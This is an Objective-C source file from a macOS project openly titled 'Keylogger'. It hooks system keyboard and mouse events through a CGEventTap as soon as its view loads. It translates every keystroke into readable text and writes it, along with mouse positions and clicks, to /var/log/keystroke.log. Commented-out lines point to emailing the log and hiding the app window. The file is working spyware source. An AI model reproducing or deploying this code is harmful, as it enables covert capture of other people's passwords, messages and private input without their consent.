//
//  ViewController.m
//  Keylogger
//
//  Created by James Folk on 3/19/15.
//  Copyright (c) 2015 James Folk. All rights reserved.
//

//#include <curl/curl.h>
//#include "curl.h"
#include "smtp-multi.h"

#import "ViewController.h"

FILE *logFile = NULL;
int counter = 0;
bool newline = true;

//http://launchd.info
//https://github.com/dannvix/keylogger-osx

//char* keyCodeToReadableString (CGKeyCode keyCode) {
//    switch ((int) keyCode) {
//        case   0: return "a";
//        case   1: return "s";
//        case   2: return "d";
//        case   3: return "f";
//        case   4: return "h";
//        case   5: return "g";
//        case   6: return "z";
//        case   7: return "x";
//        case   8: return "c";
//        case   9: return "v";
//        case  11: return "b";
//        case  12: return "q";
//        case  13: return "w";
//        case  14: return "e";
//        case  15: return "r";
//        case  16: return "y";
//        case  17: return "t";
//        case  18: return "1";
//        case  19: return "2";
//        case  20: return "3";
//        case  21: return "4";
//        case  22: return "6";
//        case  23: return "5";
//        case  24: return "=";
//        case  25: return "9";
//        case  26: return "7";
//        case  27: return "-";
//        case  28: return "8";
//        case  29: return "0";
//        case  30: return "]";
//        case  31: return "o";
//        case  32: return "u";
//        case  33: return "[";
//        case  34: return "i";
//        case  35: return "p";
//        case  37: return "l";
//        case  38: return "j";
//        case  39: return "\"";
//        case  40: return "k";
//        case  41: return ";";
//        case  42: return "\\";
//        case  43: return ",";
//        case  44: return "/";
//        case  45: return "n";
//        case  46: return "m";
//        case  47: return ".";
//        case  50: return "`";
//        case  65: return "<keypad-decimal>";
//        case  67: return "<keypad-multiply>";
//        case  69: return "<keypad-plus>";
//        case  71: return "<keypad-clear>";
//        case  75: return "<keypad-divide>";
//        case  76: return "<keypad-enter>";
//        case  78: return "<keypad-minus>";
//        case  81: return "<keypad-equals>";
//        case  82: return "<keypad-0>";
//        case  83: return "<keypad-1>";
//        case  84: return "<keypad-2>";
//        case  85: return "<keypad-3>";
//        case  86: return "<keypad-4>";
//        case  87: return "<keypad-5>";
//        case  88: return "<keypad-6>";
//        case  89: return "<keypad-7>";
//        case  91: return "<keypad-8>";
//        case  92: return "<keypad-9>";
//        case  36: return "<return>";
//        case  48: return "<tab>";
//        case  49: return "<space>";
//        case  51: return "<delete>";
//        case  53: return "<escape>";
//        case  55: return "<command>";
//        case  56: return "<shift>";
//        case  57: return "<capslock>";
//        case  58: return "<option>";
//        case  59: return "<control>";
//        case  60: return "<right-shift>";
//        case  61: return "<right-option>";
//        case  62: return "<right-control>";
//        case  63: return "<function>";
//        case  64: return "<f17>";
//        case  72: return "<volume-up>";
//        case  73: return "<volume-down>";
//        case  74: return "<mute>";
//        case  79: return "<f18>";
//        case  80: return "<f19>";
//        case  90: return "<f20>";
//        case  96: return "<f5>";
//        case  97: return "<f6>";
//        case  98: return "<f7>";
//        case  99: return "<f3>";
//        case 100: return "<f8>";
//        case 101: return "<f9>";
//        case 103: return "<f11>";
//        case 105: return "<f13>";
//        case 106: return "<f16>";
//        case 107: return "<f14>";
//        case 109: return "<f10>";
//        case 111: return "<f12>";
//        case 113: return "<f15>";
//        case 114: return "<help>";
//        case 115: return "<home>";
//        case 116: return "<pageup>";
//        case 117: return "<forward-delete>";
//        case 118: return "<f4>";
//        case 119: return "<end>";
//        case 120: return "<f2>";
//        case 121: return "<page-down>";
//        case 122: return "<f1>";
//        case 123: return "<left>";
//        case 124: return "<right>";
//        case 125: return "<down>";
//        case 126: return "<up>";
//    }
//    return "<unknown>";
//}

@implementation ViewController


+ (NSString*)keyCodeToReadableStringWithKeyCode:(CGKeyCode)keyCode modifier:(NSEventModifierFlags)modifier
{
    bool upperCase = false;
    bool shift = false;
    if(modifier & NSAlphaShiftKeyMask)
    {
        upperCase = !upperCase;
    }
    
    if(modifier & NSShiftKeyMask)
    {
        upperCase = !upperCase;
        shift = true;
    }
    
    switch ((int) keyCode) {
        case   0: if(upperCase)return @"A";return @"a";
        case   1: if(upperCase)return @"S";return @"s";
        case   2: if(upperCase)return @"D";return @"d";
        case   3: if(upperCase)return @"F";return @"f";
        case   4: if(upperCase)return @"H";return @"h";
        case   5: if(upperCase)return @"G";return @"g";
        case   6: if(upperCase)return @"Z";return @"z";
        case   7: if(upperCase)return @"X";return @"x";
        case   8: if(upperCase)return @"C";return @"c";
        case   9: if(upperCase)return @"V";return @"v";
        case  11: if(upperCase)return @"B";return @"b";
        case  12: if(upperCase)return @"Q";return @"q";
        case  13: if(upperCase)return @"W";return @"w";
        case  14: if(upperCase)return @"E";return @"e";
        case  15: if(upperCase)return @"R";return @"r";
        case  16: if(upperCase)return @"Y";return @"y";
        case  17: if(upperCase)return @"T";return @"t";
        case  18: if(shift)return @"!";return @"1";
        case  19: if(shift)return @"@";return @"2";
        case  20: if(shift)return @"#";return @"3";
        case  21: if(shift)return @"$";return @"4";
        case  22: if(shift)return @"^";return @"6";
        case  23: if(shift)return @"%";return @"5";
        case  24: if(shift)return @"+";return @"=";
        case  25: if(shift)return @"(";return @"9";
        case  26: if(shift)return @"&";return @"7";
        case  27: if(shift)return @"_";return @"-";
        case  28: if(shift)return @"*";return @"8";
        case  29: if(shift)return @")";return @"0";
        case  30: if(shift)return @"}";return @"]";
        case  31: if(upperCase)return @"O";return @"o";
        case  32: if(upperCase)return @"U";return @"u";
        case  33: if(shift)return @"{";return @"[";
        case  34: if(upperCase)return @"I";return @"i";
        case  35: if(upperCase)return @"P";return @"p";
        case  37: if(upperCase)return @"L";return @"l";
        case  38: if(upperCase)return @"J";return @"j";
        case  39: if(shift)return @"\"";return @"'";
        case  40: if(upperCase)return @"K";return @"k";
        case  41: if(shift)return @":";return @";";
        case  42: if(shift)return @"|";return @"\\";
        case  43: if(shift)return @"<";return @",";
        case  44: if(shift)return @"?";return @"/";
        case  45: if(upperCase)return @"N";return @"n";
        case  46: if(upperCase)return @"M";return @"m";
        case  47: if(shift)return @">";return @".";
        case  50: if(shift)return @"~";return @"`";
        case  65: return @"<keypad-decimal>";
        case  67: return @"<keypad-multiply>";
        case  69: return @"<keypad-plus>";
        case  71: return @"<keypad-clear>";
        case  75: return @"<keypad-divide>";
        case  76: return @"<keypad-enter>";
        case  78: return @"<keypad-minus>";
        case  81: return @"<keypad-equals>";
        case  82: return @"<keypad-0>";
        case  83: return @"<keypad-1>";
        case  84: return @"<keypad-2>";
        case  85: return @"<keypad-3>";
        case  86: return @"<keypad-4>";
        case  87: return @"<keypad-5>";
        case  88: return @"<keypad-6>";
        case  89: return @"<keypad-7>";
        case  91: return @"<keypad-8>";
        case  92: return @"<keypad-9>";
        case  36: return @"<return>";
        case  48: return @"<tab>";
        case  49: return @"<space>";
        case  51: return @"<delete>";
        case  53: return @"<escape>";
        case  55: return @"<command>";
        case  56: return @"<shift>";
        case  57: return @"<capslock>";
        case  58: return @"<option>";
        case  59: return @"<control>";
        case  60: return @"<right-shift>";
        case  61: return @"<right-option>";
        case  62: return @"<right-control>";
        case  63: return @"<function>";
        case  64: return @"<f17>";
        case  72: return @"<volume-up>";
        case  73: return @"<volume-down>";
        case  74: return @"<mute>";
        case  79: return @"<f18>";
        case  80: return @"<f19>";
        case  90: return @"<f20>";
        case  96: return @"<f5>";
        case  97: return @"<f6>";
        case  98: return @"<f7>";
        case  99: return @"<f3>";
        case 100: return @"<f8>";
        case 101: return @"<f9>";
        case 103: return @"<f11>";
        case 105: return @"<f13>";
        case 106: return @"<f16>";
        case 107: return @"<f14>";
        case 109: return @"<f10>";
        case 111: return @"<f12>";
        case 113: return @"<f15>";
        case 114: return @"<help>";
        case 115: return @"<home>";
        case 116: return @"<pageup>";
        case 117: return @"<forward-delete>";
        case 118: return @"<f4>";
        case 119: return @"<end>";
        case 120: return @"<f2>";
        case 121: return @"<page-down>";
        case 122: return @"<f1>";
        case 123: return @"<left>";
        case 124: return @"<right>";
        case 125: return @"<down>";
        case 126: return @"<up>";
    }
    return @"<unknown>";
}



- (BOOL)installKeyboardLogger
{
    CGEventMask keyboardMask = CGEventMaskBit(kCGEventFlagsChanged) | CGEventMaskBit(kCGEventKeyDown);
    CGEventMask mouseMask = CGEventMaskBit(kCGEventMouseMoved) |   CGEventMaskBit(kCGEventLeftMouseDown) |
    CGEventMaskBit(kCGEventRightMouseDown);
    
    CGEventMask mask = keyboardMask + mouseMask;// + mouseMask;//CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventMouseMoved);
    
    // Try to create keyboard-only hook. It will fail if Assistive Devices are not set.
    mMachPortRef =  CGEventTapCreate(
                                     kCGAnnotatedSessionEventTap,
                                     kCGTailAppendEventTap, // kCGHeadInsertEventTap
                                     kCGEventTapOptionListenOnly,
                                     keyboardMask,
                                     (CGEventTapCallBack)eventTapFunction,
                                     (__bridge void *)(self) );
    if (!mMachPortRef)
        NSLog(@"Can't install keyboard hook.");
//        [mLogFile logNeedAssistiveDevice: @"Can't install keyboard hook."];
    else
        CFRelease(mMachPortRef);
    
    mMachPortRef = CGEventTapCreate(
                                    kCGAnnotatedSessionEventTap,
                                    kCGTailAppendEventTap, // kCGHeadInsertEventTap
                                    kCGEventTapOptionListenOnly,
                                    mask,
                                    (CGEventTapCallBack)eventTapFunction,
                                    (__bridge void *)(self) );
    if (!mMachPortRef)
    {
//        [mLogFile logNeedAssistiveDevice: @"Can't install keyboard&mouse hook."];
        NSLog(@"Can't install keyboard&mouse hook.");
        return NO;
    }
    
    mKeyboardEventSrc = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, mMachPortRef, 0);
    if ( !mKeyboardEventSrc )
        return NO;
    
    CFRunLoopRef runLoop = CFRunLoopGetCurrent();
    if ( !runLoop )
        return NO;
    
    CFRunLoopAddSource(runLoop,  mKeyboardEventSrc, kCFRunLoopDefaultMode);
    return YES;
}


CGEventRef eventTapFunction(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
{
    if (type != NX_KEYDOWN && type != NX_OMOUSEDOWN && type != NX_OMOUSEUP && type != NX_OMOUSEDRAGGED &&
        type != NX_LMOUSEUP && type != NX_LMOUSEDOWN && type != NX_RMOUSEUP && type != NX_RMOUSEDOWN &&
        type != NX_MOUSEMOVED && type != NX_LMOUSEDRAGGED && type != NX_RMOUSEDRAGGED)
        return event;
    
    NSEvent* sysEvent = [NSEvent eventWithCGEvent:event];
    
    
//    NSLog(@"%f, %f, %f", [sysEvent deltaX], [sysEvent deltaY], [sysEvent deltaZ]);
//    NSLog(@"%f, %f", [sysEvent locationInWindow].x, [sysEvent locationInWindow].y);
    
    
    
    time_t currentTime;
    time(&currentTime);
    struct tm *time_info = localtime(&currentTime);
    
    char fmtTime[32];
    strftime(fmtTime, 32, "%F %T", time_info);
    NSString *s = [[NSString alloc] initWithUTF8String:fmtTime];
    
    if(logFile == NULL)
    {
        logFile = fopen("/var/log/keystroke.log", "a");
    }
    if(type == NX_MOUSEMOVED)
    {
        if(logFile != NULL)
        {
            if(newline)
            {
                newline = false;
                fprintf(logFile, "\n%f, %f\n", [sysEvent locationInWindow].x, [sysEvent locationInWindow].y);
            }
            else
            {
                fprintf(logFile, "%f, %f\n", [sysEvent locationInWindow].x, [sysEvent locationInWindow].y);
            }
            
        }
    }
    
    if(type == NX_LMOUSEDOWN)
    {
        if(logFile != NULL)
        {
            if(newline)
            {
                newline = false;
                fprintf(logFile, "\n<%f, %f>\n", [sysEvent locationInWindow].x, [sysEvent locationInWindow].y);
            }
            else
            {
                fprintf(logFile, "<%f, %f>\n", [sysEvent locationInWindow].x, [sysEvent locationInWindow].y);
            }
        }
    }
    
    //NSLog(@"%lu %d\n", [sysEvent type], type);
    counter++;
    if (type == NX_KEYDOWN && [sysEvent type] == NSKeyDown)
    {
        newline = true;
        if (![sysEvent isARepeat])
        {
//            NSLog([sysEvent characters];
            NSString *f = [[NSString alloc] initWithString:[ViewController keyCodeToReadableStringWithKeyCode:[sysEvent keyCode] modifier:[sysEvent modifierFlags]]];
//            NSLog(@"%@ - %@", s, f);
            
            if(logFile != NULL)
            {
                
//                fprintf(logFile, "[%s] '%s'\n", [s UTF8String], [f UTF8String]);
                fprintf(logFile, "%s", [f UTF8String]);
            }
            
        }
    }
    else if (type == NX_FLAGSCHANGED && [sysEvent type] == NSFlagsChanged)
    {
        newline = true;
//        if (![sysEvent isARepeat])
//        if([sysEvent key])
        {
//            [sysEvent keyCode];
            
            NSString *f = [[NSString alloc] initWithString:[ViewController keyCodeToReadableStringWithKeyCode:[sysEvent keyCode] modifier:[sysEvent modifierFlags]]];
            
//            NSLog(@"%@ - %@", s, f);
            
            if(logFile != NULL)
            {
                
                fprintf(logFile, "%s", [f UTF8String]);
            }
            
            
        }
    }
//    else
//        [(ControlPanelController*)refcon handleMouse];
    
    if (counter % 100 == 0)
    {
        fflush(logFile);
//        send_email3();
    }
    
    return event;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    
//    ProcessSerialNumber psn = { 0, kCurrentProcess };
//    TransformProcessType(&psn, kProcessTransformToForegroundApplication);

    
    
    [self installKeyboardLogger];
    
//    NSWindow *window = [[NSApplication sharedApplication] mainWindow];
//    [window orderOut:self];

    // Do any additional setup after loading the view.
}

- (void)setRepresentedObject:(id)representedObject {
    [super setRepresentedObject:representedObject];

    // Update the view, if already loaded.
}

@end
